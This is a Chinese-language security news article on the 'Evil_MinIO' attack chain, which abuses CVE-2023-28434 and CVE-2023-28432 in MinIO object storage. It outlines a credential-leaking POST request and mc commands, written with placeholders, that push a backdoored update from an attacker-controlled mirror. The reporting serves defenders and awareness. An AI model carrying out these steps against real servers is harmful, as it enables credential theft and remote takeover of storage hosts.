#  EVIL_MINIO 漏洞被用于攻击 MINIO 存储系统   
 安全客   2023-09-05 16:58  
  
Security Joes 研究人员观察到，一个未知的威胁参与者利用 MinIO 对象存储系统中的漏洞的公开可用的漏洞利用链，在易受攻击的服务器上实现任意代码执行。  
  
对象存储是一种数据存储架构，用于将非结构化数据存储到称为“对象”的单元中，并将它们存储在结构扁平的数据环境中。此类服务的领先提供商是 AWS、Google Cloud 和 Microsoft Azure。  
  
经过调查，Security Joes 研究人员发现该漏洞利用链之前并未在野外观察到，或者至少没有记录在案。  
  
“我们的团队在调查的一次攻击中观察到的一系列漏洞呈现出一种令人担忧的情况，攻击者有可能获得远程执行代码的能力，并完全控制运行易受攻击版本的高性能分布式对象存储系统的系统。称为 MinIO。  
该产品是一组更大的“尚不存在”的攻击向量的一部分，称为非本机对象存储服务。”  
  
该漏洞被称为 Evil_MinIO，使用 CVE-2023-28434（CVSS 评分：8.8）和CVE-2023-28432  
（CVSS 评分：7.5）漏洞。  
  
4 月，美国网络安全和基础设施安全局 (CISA) 将 MinIO 漏洞CVE-2023-28432  
添加到其已知利用漏洞目录中。  
  
远程攻击者可以利用这些缺陷来暴露存储在受损安装中的敏感信息，并促进 MinIO 应用程序运行的主机上的远程代码执行 (RCE)。  
  
攻击者可以触发问题，将精心设计的请求发送到端点“/minio/bootstrap/v1/verify”并检索易受攻击实例的管理凭据。  
  
“利用过程从针对端点“/minio/bootstrap/v1/verify”的精心设计的请求开始，该请求允许攻击者获取应用程序使用的环境变量的值。  
这变得尤为重要，因为 MinIO 依赖环境变量来配置管理员凭据，从而加剧了漏洞的严重性。  
换句话说，通过一个请求，攻击者就可以检索易受攻击实例的管理员凭据。”  
  
mc admin update 命令  
更新部署中的所有 MinIO 服务器，它还支持在部署没有公共 Internet 访问的环境中使用私有镜像服务器。  
  
攻击者可以通过推送“邪恶”更新而不是真实的 MinIO 二进制文件来安排欺骗性更新。  
  
以下是在易受攻击的 MinIO 实例中远程执行任意代码的分步过程：  
- 向端点/minio/bootstrap/v1/verify 发出POST 请求以公开管理员帐户的凭据。  
  
- 攻击者使用步骤 1 中获取的凭据配置 MinIO 客户端与易受攻击的实例进行交互。为此，需要以下命令行：mc alias set [ALIAS] [URL_TARGET_MINIO] [ACCESS_KEY] [SECRET_KEY] mc alias list  
  
- 攻击者在受感染的 MinIO 实例上触发更新过程，指向远程服务器上托管的恶意负载。为此，执行以下命令。mc admin update [ALIAS] [MIRROR_URL] –yes  
  
- “邪恶”MinIO 已安装，现在包含一个全局后门，允许攻击者在主机上执行命令。  
  
专家指出，与Web shell部署不同，在MinIO攻击场景中，攻击者不会在磁盘上留下常规可疑脚本的痕迹  
  
据专家称，攻击背后的威胁参与者具有独特的特征，在使用 bash 脚本和 Python 方面拥有丰富的经验和专业知识。攻击者还展示了使用后门访问来删除用于后利用活动的补充有效负载的能力。  
  
攻击者能够使用特定的下载器脚本来针对 Linux 和 Windows 系统。  
  
截至报告发布时，研究人员发现超过 50,000 个 MinIO 安装使用 Shodan 在线暴露。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/Ok4fxxCpBb6ueebO4fRq28RRQicTcIF81R3YxsAnroPzU2wwaoMrMya5zd68rIdUhrako4CMNRFdp9mzsCDq10A/640?wx_fmt=png "")  
  
报告原文：  
  
https://www.securityjoes.com/post/new-attack-vector-in-the-cloud-attackers-caught-exploiting-object-storage-services  
  
声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
  
  
  
  
